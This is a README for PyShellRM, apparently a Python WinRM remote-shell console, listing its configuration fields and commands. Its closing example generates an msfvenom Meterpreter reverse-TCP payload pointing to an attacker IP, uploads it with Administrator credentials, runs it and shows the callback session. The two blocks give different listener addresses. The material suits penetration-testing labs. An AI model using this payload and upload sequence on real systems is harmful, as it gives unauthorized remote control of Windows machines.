# PyShellRM

## Configuration

All configuration options are defined in the Protocol object.

1. Endpoint: The WinRM webservice endpoint
    * `http://server.com`

2. Transport: Transport type
    *  \[`plaintext`, `kerberos`, `ssl`, `ntlm`, `credssp`]

3. Username: The remote user's username
    *  `domain\user`

4. Password: The remote user's password
    *  `hunter2`

5. Server Cert Validation: Whether server certificate should be validated
    *  \[`validate`, `ignore`]

```Yaml
server:
    endpoint: http://10.10.10.1:5985/wsman
    transport: ntlm
    username: User
    password: Password
    server_cert_validation: ignore
```

## Commands

1. connect
2. list
3. hosts                              
4. set
5. unset
6. upload
7. shell
8. close
9. exit/quit

### Connect

Connect uses the defined Protocol object to attempt a WinRM connection.

Example:

```
pyshellrm:~$ connect server
[*] Connecting to http://10.10.10.1:5985/wsman
[+] Connected to http://10.10.10.1:5985/wsman
```

### List

Lists the current connect shells.

Example:

```
pyshellrm:~$ list
938891EA-A825-4871-864C-C5F58A3EA135
```

### Hosts

Lists the available hosts imported from the config.yml file.

Example:

```
pyshellrm:~$ hosts
server
```

### Set

Sets the current shell.

Example:

```
pyshellrm:~$ set 938891EA-A825-4871-864C-C5F58A3EA135
Current Shell: 938891EA-A825-4871-864C-C5F58A3EA135
```

### Unset

Unsets the current shell.

Example:

```
pyshellrm:~$ unset
```

### Upload

Uploads a file from `local_path` to `remote_path`.

Example:

```
pyshellrm:~$ upload /home/local/shell.exe "C:\Users\remote\shell.exe"
[*] Uploading file /home/local/shell.exe to C:\Users\remote\shell.exe
Sending chunk [0/14]
Sending chunk [1/14]
...
Sending chunk [13/14]
Sending chunk [14/14]
```

### Shell

Runs commands in a Powershell prompt. Press ctrl+c to exit.

Example:

```
pyshellrm:~$ shell
PS> whoami
[+] remoteserver\administrator
```

### Close

Closes the connection to the current shell.

### Exit/Quit

Exits PyShellRM.

## Example

First we'll generate an msfvenom payload.

```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=9999 -f exe > shell.exe
```

Next we'll configure our Protocol.

```Yaml
server:
    endpoint: http://10.10.10.1:5985/wsman
    transport: ntlm
    username: Administrator
    password: hunter2
    server_cert_validation: ignore
```

Finally, we can launch the PyShellRM console and upload our reverse shell.

```
pyshellrm:~$ connect server
[*] Connecting to http://10.10.10.1:5985/wsman
[+] Connected to http://10.10.10.1:5985/wsman
pyshellrm:~$ set 85CB12CA-F0DB-468B-886B-2E4064C46727
Current Shell: 85CB12CA-F0DB-468B-886B-2E4064C46727
pyshellrm:~$ upload shell.exe "C:\Users\Administrator\shell.exe"
[*] Uploading file shell.exe to C:\Users\Administrator\shell.exe
Sending chunk [0/42]
Sending chunk [1/42]
...
Sending chunk [41/42]
Sending chunk [42/42]
pyshellrm:~$ shell
PS> ls
[+] 

    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        4/21/2019  11:08 AM                3D Objects
d-r---        4/21/2019  11:08 AM                Contacts
d-r---        4/22/2019   9:05 AM                Desktop
d-r---        4/22/2019   8:13 AM                Documents
d-r---        4/21/2019  11:08 AM                Downloads
d-r---        4/21/2019  11:08 AM                Favorites
d-r---        4/21/2019  11:08 AM                Links
d-r---        4/21/2019  11:08 AM                Music
d-r---        4/21/2019  11:08 AM                Pictures
d-r---        4/21/2019  11:08 AM                Saved Games
d-r---        4/21/2019  11:08 AM                Searches
d-r---        4/21/2019  11:08 AM                Videos
-a----        8/11/2019   1:00 PM          73802 shell.exe

PS> ./shell.exe
```

Callback received!

```
payload => windows/meterpreter/reverse_tcp
lhost => 10.10.14.2
lport => 9999
[*] Started reverse TCP handler on 10.10.14.2:9999 
[*] Sending stage (179779 bytes) to 10.10.10.1
[*] Meterpreter session 1 opened (10.10.14.2:9999 -> 10.10.10.1:49692) at 1970-01-01 00:00:00 0000

meterpreter > getuid
Server username: REMOTESERVER\Administrator
```
